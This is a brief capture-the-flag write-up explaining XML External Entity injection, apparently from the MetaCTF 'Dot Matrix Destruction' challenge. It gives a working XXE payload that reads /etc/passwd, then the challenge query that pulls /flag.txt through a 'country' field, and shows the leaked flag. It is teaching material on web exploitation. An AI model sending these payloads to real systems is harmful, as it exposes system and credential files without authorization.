##CTF Notes on XML External Entity

Credits: {https://metactf.com/blog/flash-ctf-dot-matrix-destruction/}

What’s XXE? The linked documents might explain it better, but effectively, in XML, you can define an ENTITY, and using the SYSTEM keyword, make it refer to the contents of a file on the disk. 
For example, payloads like this one will cause the XML parser to read the contents of /etc/passwd and place it into the <foo> tag.

```
<?xml version="1.0" ?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>

```

This is an XXE (XML External Entity) challenge. The API uses XML, and vulnerable XML parser implementations support a weird feature where you can include the contents of arbitrary files on the disk.

<img width="2040" height="692" alt="image" src="https://github.com/user-attachments/assets/8c3e8289-5c45-48aa-b21c-c5705845bbb1" />

In the CTF it worked like this 

Before
``` 
An invalid country code will give us <error>The country code blah is not a recognized country code.</error>.
```
Query
``` 

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<query><search>
</search><country>&xxe;</country></query>

```
After
``` 
<error>The country code MetaCTF{y3ah_xxe_d0e5_r0ck_d0esnt_it?} is not a recognized country code.</error>
```
